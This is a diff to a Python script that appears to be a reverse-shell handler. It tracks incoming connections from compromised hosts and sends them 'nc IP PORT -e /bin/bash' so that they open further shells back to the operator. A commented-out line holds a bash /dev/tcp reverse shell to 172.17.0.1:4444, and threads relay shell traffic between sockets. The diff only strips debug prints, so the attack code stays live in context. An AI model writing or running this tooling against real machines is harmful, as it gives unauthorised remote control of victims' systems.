@@ -22,19 +22,16 @@ class connection:
         self.out_file = f"{self.addr}/out"
         self.sock = socket.socket()
         self.connected = False
-        #print(f"connection received from {self.addr}:{self.port}")
 
 
     def create_new(self):
         global PORT, IP
-        print(f"SENDING: nc {IP} {PORT} -e /bin/bash & \n".encode())
         self.conn.send(f"nc {IP} {PORT} -e /bin/bash & \n".encode())
         #self.conn.send(b"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &\n")
 
     def connect(self, sock):
         self.sock = sock[0]
         self.connected = True
-        print("CONNECTED", sock, self.conn)
         threading.Thread(target=self.in_stream).start()
         threading.Thread(target=self.out_stream).start()
 
@@ -44,7 +41,6 @@ class connection:
         while True:
             data = self.conn.recv(1024)
             if data:
-                print("IN", data)
                 self.sock.sendall(data)
 
 
@@ -52,7 +48,6 @@ class connection:
         while True:
             data = self.sock.recv(1024)
             if data:
-                print("OUT", data)
                 self.conn.sendall(data)
 
     
@@ -60,7 +55,6 @@ class connection:
 
 def send(ip, cmd):
     global IP, PORT
-    #os.system(f"/bin/bash -c '(printf {ip}; sleep 0.1; echo {cmd}) | nc 127.0.0.1 {PORT}'")
     s = socket.socket()
     s.connect(("127.0.0.1", PORT))
     st = str(ip) + "\n"
@@ -137,7 +131,6 @@ def run(quiet_mode=False):
                 managed_connections.append(connection(connections[-1]))
                 
                 latest = connections[-1][1][0]
-                print("CONNECTION FROM", latest)
 
                 if not latest in addresses:             # if unique address
                     id = len(unique_addresses)
@@ -153,7 +146,6 @@ def run(quiet_mode=False):
                         threading.Thread(target=run_t,args=(id,)).start()
                 
                 for w in waitingl:                      # if user is waiting to connect
-                    print("waitingl check::", managed_connections[-1], w)
                     if managed_connections[-1].addr == w[0]:
                         managed_connections[-1].connect(w[1])
                         waitingl.remove(w)
